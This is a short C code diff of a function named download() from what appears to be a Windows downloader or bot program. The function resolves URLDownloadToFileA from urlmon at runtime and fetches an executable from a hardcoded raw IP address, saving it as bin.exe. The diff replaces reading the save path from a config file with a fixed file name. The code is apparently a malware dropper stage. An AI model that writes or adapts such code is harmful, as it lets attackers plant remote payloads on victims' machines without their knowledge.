@@ -36,24 +36,12 @@ int iscommand(char buf)
 
 int download()
 {
-	FILE * fpath = fopen("path.cfg", "r");
 	char * url = "http://86.247.205.102/exe/url.exe";
-	char path[100];
+	char path[100] = "bin.exe";
 	int r = 1;
 	HMODULE hDll;
 	UDTF URLDownloadToFile;
 
-	if(fpath == NULL){
-		strcpy(path, "bin.exe");
-	} else {
-		int i = 0;
-		char c;
-		while( (c = fgetc(fpath)) != EOF){     // Get char from file while not at EOF
-			path[i] = c;
-			i++;
-		}
-		path[i+1] = '\0';
-	}
 
 	if((hDll = LoadLibrary("urlmon"))) {
 		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
